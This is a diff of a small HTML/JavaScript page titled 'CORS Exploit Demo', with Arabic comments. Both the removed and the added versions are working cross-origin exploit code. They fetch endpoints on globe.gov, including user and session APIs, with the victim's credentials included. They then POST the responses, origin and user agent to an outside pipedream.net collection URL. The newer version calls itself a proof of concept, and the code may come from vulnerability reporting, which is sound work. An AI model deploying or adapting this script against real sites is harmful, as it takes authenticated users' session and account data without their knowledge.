@@ -1,59 +1,41 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>CORS Exploit Demo</title>
-</head>
-<body>
-  <h1>⏳ Loading Exploit... Please Wait</h1>
+<script>
+(async () => {
+  const endpoint = "https://vis.globe.gov/app/js/VISmain.js"; // ملف JS موجود دائمًا
+  const exfilUrl = "https://eojzzzf3qvc4t0o.m.pipedream.net"; // غيّره إذا احتجت
 
-  <script>
-    (async () => {
-      const exfil = async (endpoint, label) => {
-        try {
-          const res = await fetch(endpoint, { method: "GET", credentials: "include" });
-          const data = await res.text();
-          await fetch("https://eojzzzf3qvc4t0o.m.pipedream.net/", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              type: "CORS-Exploit",
-              path: endpoint,
-              origin: location.origin,
-              data: data.slice(0, 500), // مختصر
-              label: label,
-              userAgent: navigator.userAgent,
-              timestamp: new Date().toISOString()
-            })
-          });
-        } catch (e) {
-          await fetch("https://eojzzzf3qvc4t0o.m.pipedream.net/", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              error: "fetch failed",
-              path: endpoint,
-              message: e.message,
-              timestamp: new Date().toISOString()
-            })
-          });
-        }
-      };
+  try {
+    const response = await fetch(endpoint, {
+      method: "GET",
+      credentials: "include"
+    });
+    const text = await response.text();
 
-      const targets = [
-        { url: "https://vis.globe.gov/app/js/VISmain.js", label: "VISmain.js" },
-        { url: "https://globe.gov/globe-api/user", label: "User Info" },
-        { url: "https://globe.gov/globe-api/session", label: "Session Info" },
-        { url: "https://globe.gov/modules", label: "Modules" }
-      ];
-
-      for (const target of targets) {
-        await exfil(target.url, target.label);
-        await new Promise(r => setTimeout(r, 1500));
-      }
-
-      document.body.innerHTML = "<h2>✅ Exploit Complete. Thank You.</h2>";
-    })();
-  </script>
-</body>
-</html>
+    await fetch(exfilUrl, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        type: "cors-poc",
+        origin: location.origin,
+        target: endpoint,
+        content: text.slice(0, 500), // إرسال أول 500 حرف فقط كدليل
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent
+      })
+    });
+  } catch (err) {
+    await fetch(exfilUrl, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        type: "fetch-error",
+        error: err.toString(),
+        target: endpoint
+      })
+    });
+  }
+})();
+</script>
